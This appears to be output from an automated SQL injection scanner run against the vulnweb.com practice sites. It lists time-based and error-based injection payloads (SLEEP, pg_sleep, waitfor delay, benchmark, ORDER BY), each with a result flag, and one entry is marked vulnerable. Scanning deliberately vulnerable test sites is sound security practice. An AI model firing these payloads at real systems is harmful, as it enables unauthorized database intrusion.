URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or SLEEP(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: waitfor delay '00:00:05'#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1)), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '\", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '\", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: or benchmark(50000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AnD SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AnD SLEEP(5), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
